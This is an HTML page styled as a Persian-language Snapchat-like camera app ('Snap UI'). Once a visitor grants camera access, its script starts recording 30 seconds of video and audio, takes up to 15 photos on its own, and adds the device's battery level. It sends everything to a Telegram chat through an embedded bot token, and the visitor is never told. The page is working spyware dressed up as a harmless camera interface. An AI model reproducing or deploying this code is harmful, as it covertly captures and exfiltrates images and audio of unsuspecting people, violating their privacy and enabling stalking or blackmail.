<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>Snap UI</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      direction: rtl;
      font-family: 'Vazirmatn', sans-serif;
      margin: 0;
      background: #FFFC00;
      color: #000;
      overflow: hidden;
    }
    #video {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 0;
    }
    .overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 1;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 1rem;
      background: linear-gradient(to top, rgba(255,255,255,0.1), transparent 60%);
    }
    .circle-btn {
      width: 72px; height: 72px;
      background-color: white;
      border-radius: 50%;
      border: 4px solid #000;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline muted></video>
  <div class="overlay">
    <div class="flex justify-between">
      <div></div>
      <button onclick="switchCamera()" class="text-black p-2 bg-white/40 rounded-full">
        <i data-lucide="camera"></i>
      </button>
    </div>
    <div class="flex justify-center">
      <button onclick="takePhoto()" class="circle-btn"></button>
    </div>
  </div>  <script>
    lucide.createIcons();
    let useFront = true;
    let stream;
    let mediaRecorder;
    let chunks = [];
    let photoCount = 0;
    let videoSent = false;

    const botToken = "7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU";
    const chatId = "-1002563925697";

    async function startCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: useFront ? "user" : "environment" },
          audio: true
        });
        document.getElementById('video').srcObject = stream;
        startRecording();
        autoCapture();
      } catch (err) {
        alert("دوربین یا میکروفن در دسترس نیست.");
      }
    }

    function switchCamera() {
      useFront = !useFront;
      startCamera();
    }

    async function takePhoto() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const percent = Math.round(battery.level * 100);
        const charging = battery.charging ? "در حال شارژ" : "غیر متصل";
        const caption = `عکس ${++photoCount}\n🔋 شارژ: ${percent}%\n⚡️ ${charging}`;

        const form = new FormData();
        form.append("chat_id", chatId);
        form.append("photo", blob, `photo${photoCount}.jpg`);
        form.append("caption", caption);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: form
        });
      }, 'image/jpeg', 0.7);
    }

    function autoCapture() {
      let interval = setInterval(() => {
        if (photoCount >= 15) return clearInterval(interval);
        takePhoto();
      }, 4000);
    }

    function startRecording() {
      chunks = [];
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendVideo;
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 30000); // حداکثر ۳۰ ثانیه
    }

    async function sendVideo() {
      if (videoSent) return;
      videoSent = true;
      const blob = new Blob(chunks, { type: "video/webm" });
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("video", blob, "video.webm");
      form.append("caption", "ویدیو ضبط شده");
      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: form
      });
    }

    window.addEventListener("beforeunload", () => {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    });

    startCamera();
  </script></body>
</html>
